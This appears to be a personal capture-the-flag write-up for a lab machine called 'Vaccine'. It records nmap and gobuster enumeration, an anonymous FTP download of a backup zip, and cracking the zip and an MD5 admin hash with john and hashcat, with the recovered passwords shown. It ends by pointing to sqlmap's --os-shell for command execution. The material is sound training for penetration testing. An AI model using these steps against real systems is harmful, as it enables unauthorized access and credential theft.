# Vaccine

|     Local    |     Remote    |
| ------------ | ------------- |
| 10.10.15.104 | 10.129.248.107 |
|              |   |
|              |  |

---

## Nmap
```
nmap 10.129.248.107
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-12 20:49 EDT
Nmap scan report for 10.129.248.107
Host is up (0.058s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

```
nmap -Pn -sSVC -O -p 21,22,80 10.129.248.107
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-12 20:50 EDT
Nmap scan report for 10.129.248.107
Host is up (0.048s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.0p1 Ubuntu 6ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c0:ee:58:07:75:34:b0:0b:91:65:b2:59:56:95:27:a4 (RSA)
|   256 ac:6e:81:18:89:22:d7:a7:41:7d:81:4f:1b:b8:b2:51 (ECDSA)
|_  256 42:5b:c3:21:df:ef:a2:0b:c9:5e:03:42:1d:69:d0:28 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.41 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 4.15 - 5.8 (96%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.41 seconds
```

### Review & Summary
1. Ran a searchsploit on vsftpd, OpenSSH, and Apache: nada
2. Need some more enumeration...

---

## HTTP Enumeration

Opened the webpage: It's a login page for "MegaCorp Login"

### NSE

#### banner & enum (same results)
```
map -Pn -sV -p 80 --script banner 10.129.248.107
nmap -Pn -sV -p 80 --script http-enum 10.129.248.107
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-12 20:58 EDT
Nmap scan report for 10.129.248.107
Host is up.

PORT   STATE    SERVICE VERSION
80/tcp filtered http
```

#### http-headers
```
nmap -Pn -sV -p 80 --script http-headers 10.129.248.107
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-12 20:58 EDT
Nmap scan report for 10.129.248.107
Host is up (0.048s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-headers: 
|   Date: Mon, 13 May 2024 00:58:46 GMT
|   Server: Apache/2.4.41 (Ubuntu)
|   Set-Cookie: PHPSESSID=ilrrij5nq492jr9cvopvmhnaei; path=/
|   Expires: Thu, 19 Nov 1981 08:52:00 GMT
|   Cache-Control: no-store, no-cache, must-revalidate
|   Pragma: no-cache
|   Connection: close
|   Content-Type: text/html; charset=UTF-8
|   
|_  (Request type: HEAD)
```

#### http-methods
```
nmap -Pn -sV -p 80 --script http-methods 10.129.248.107
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-12 20:59 EDT
Nmap scan report for 10.129.248.107
Host is up (0.048s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
```

### Dir Busting

#### GoBuster
```
gobuster dir -u http://10.129.248.107 -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.248.107
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 279]
/.htpasswd            (Status: 403) [Size: 279]
/.htaccess            (Status: 403) [Size: 279]
/index.php            (Status: 200) [Size: 2312]
/server-status        (Status: 403) [Size: 279]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```

---

## FTP

### Anonymous Login: ftp-anon
```
nmap -Pn -sV -p 21 --script ftp-anon 10.129.248.107 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-12 21:06 EDT
Nmap scan report for 10.129.248.107
Host is up (0.048s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rwxr-xr-x    1 0        0            2533 Apr 13  2021 backup.zip
Service Info: OS: Unix
```

### Login as Anonymous
```
ftp 10.129.248.107
Connected to 10.129.248.107.
220 (vsFTPd 3.0.3)
Name (10.129.248.107:greg): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
```

Run an `ls` to see what you get...
```
ftp> pwd
Remote directory: /
ftp> ls
229 Entering Extended Passive Mode (|||10130|)
150 Here comes the directory listing.
-rwxr-xr-x    1 0        0            2533 Apr 13  2021 backup.zip
```

Download that file: 
```
ftp> get backup.zip
local: backup.zip remote: backup.zip
229 Entering Extended Passive Mode (|||10507|)
150 Opening BINARY mode data connection for backup.zip (2533 bytes).
100% |***************************************************************************************************************|  2533        2.30 MiB/s    00:00 ETA
226 Transfer complete.
```

Tried to unzip it and it's password protected.
```
unzip backup.zip 
Archive:  backup.zip
[backup.zip] index.php password: 
   skipping: index.php               incorrect password
   skipping: style.css               incorrect password
```

## Crack the Zip File Password

### Convert the Zip Password to John Format
```
zip2john backup.zip > zip.hash
```

### Crack It
```
john zip.hash 
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
741852963        (backup.zip)     
1g 0:00:00:00 DONE 2/3 (2024-05-12 21:19) 14.28g/s 1097Kp/s 1097Kc/s 1097KC/s 123456..ferrises
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

### Show It
```
john --show zip.hash 
backup.zip:741852963::backup.zip:style.css, index.php:backup.zip

1 password hash cracked, 0 left
```

### Unzip the Zip File
```
unzip backup.zip 
Archive:  backup.zip
[backup.zip] index.php password: [741852963]
  inflating: index.php               
  inflating: style.css

ls -l
total 16
-rw-r--r-- 1 greg greg 2533 Apr 13  2021 backup.zip
-rw-r--r-- 1 root root 2594 Feb  3  2020 index.php
-rw-r--r-- 1 root root 3274 Feb  3  2020 style.css
-rw-r--r-- 1 root root 2174 May 12 21:16 zip.hash
```

## grep for goodies
```
grep -rnw ./ -e "password" 2>/dev/null
./index.php:4:  if(isset($_POST['username']) && isset($_POST['password'])) {
./index.php:5:    if($_POST['username'] === 'admin' && md5($_POST['password']) === "2cb42f8734ea607eefed3b70af13bbd3") {
./index.php:34:        <input id="login__password" type="password" name="password" class="form__input" placeholder="Password" required>
./style.css:123:.form input[type='password'],
./style.css:151:.login input[type='password'],
./style.css:168:.login input[type='password'],
./style.css:175:.login input[type='password']:focus,
./style.css:176:.login input[type='password']:hover,
```

It looks like the **admin** password is hashed as an md5: `2cb42f8734ea607eefed3b70af13bbd3'

## Crack it with [Hashcat](../../hashcat.md)
```
hashcat -a 0 -m 0 -o cracked_admin.txt admin_pwd.txt /usr/share/wordlists/rockyou.txt
cat cracked_admin.txt 
2cb42f8734ea607eefed3b70af13bbd3:qwerty789
```
- It works: I used it to sign into the webpage... 

** sqlmap is still needing to be transferred over from OneNote to this repo **
** --os-shell option passed to sqlmap will give you command execution via sql injection**
https://www.infosecinstitute.com/resources/penetration-testing/important-sqlmap-commands/
